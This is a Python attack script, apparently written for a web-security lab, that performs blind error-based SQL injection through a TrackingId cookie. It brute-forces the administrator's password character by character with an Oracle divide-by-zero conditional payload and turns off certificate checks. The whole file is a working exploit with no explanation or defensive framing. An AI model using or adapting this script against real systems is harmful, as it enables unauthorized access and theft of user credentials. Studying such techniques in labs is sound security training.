import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sqli_pass_cracker(url):
	password = ''
	for i in range(1,21):
		for j in range(32,126):
			payload = f"' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,{i},1))='{j}')|| '"
			encoded_payload = urllib.parse.quote(payload)
			cookies = {'TrackingId':'6ELqawW4HlOcm5Nz' + encoded_payload, 'session':'6a0CVWWvcAPFDfFuyBJ87tQRRmuYTAym'}
			r = requests.get(url, cookies=cookies, verify=False)
			if r.status_code == 500:
				password += chr(j)
				sys.stdout.write('\r' + password)
				sys.stdout.flush()
				break
			else:
				sys.stdout.write('\r' + password + chr(j))
				sys.stdout.flush()


def main():
	if len(sys.argv) !=2:
		print(f"Usage: {sys.argv[0]} <url>")
		print(f"Example: {sys.argv[0]} www.example.com")

	url = sys.argv[1]
	print("Cracking the Password ....")
	sqli_pass_cracker(url)

if __name__ == '__main__':
	main()